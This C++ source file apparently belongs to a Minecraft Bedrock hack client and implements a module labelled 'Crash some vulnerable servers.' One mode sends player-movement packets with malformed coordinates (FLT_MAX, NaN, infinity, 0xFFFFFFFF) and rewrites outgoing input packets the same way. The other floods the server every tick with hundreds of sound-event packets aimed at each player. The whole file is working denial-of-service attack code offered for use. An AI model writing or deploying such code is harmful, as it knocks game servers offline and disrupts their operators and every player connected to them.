#include "Crasher.h"

Crasher::Crasher() : IModule(0, Category::MISC, "Crash some vulnerable servers.") {
	mode = SettingEnum(this)
		.addEntry(EnumEntry("UnlegitPositions", 0))
		.addEntry(EnumEntry("SoundAura", 1));
	registerEnumSetting("Mode", &mode, 0);
}

Crasher::~Crasher() {
}

const char* Crasher::getModuleName() {
	return ("Crasher");
}

void Crasher::onEnable() {
	if (g_Data.getLocalPlayer() == nullptr)
		setEnabled(false);
}

void Crasher::onTick(C_GameMode* gm) {
	if (g_Data.getLocalPlayer() == nullptr)
		setEnabled(false);

	if (mode.selected == 0) {
		C_MovePlayerPacket movePacket;
		movePacket.Position = vec3_t(FLT_MAX, FLT_MAX, FLT_MAX);
		g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&movePacket);
		movePacket.Position = vec3_t(NAN, NAN, NAN);
		g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&movePacket);
		movePacket.Position = vec3_t(INFINITY, INFINITY, INFINITY);
		g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&movePacket);
	}
	else if (mode.selected == 1) {
		g_Data.forEachEntity([](C_Entity* entity, bool valid) {
			if (entity->isPlayer()) {
				for (int i = 0; i < 437; i++) {
					LevelSoundEventPacket soundEventPacket;
					soundEventPacket.sound = i;
					soundEventPacket.pos = *entity->getPos();
					g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&soundEventPacket);
				}
			}
			});
	}
}

void Crasher::onSendPacket(C_Packet* packet, bool& cancelSend) {
	if (mode.selected == 0) {
		if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
			PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
			InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
			InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
			InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
		}
		/*else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
			C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
			movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
		}*/
	}
}
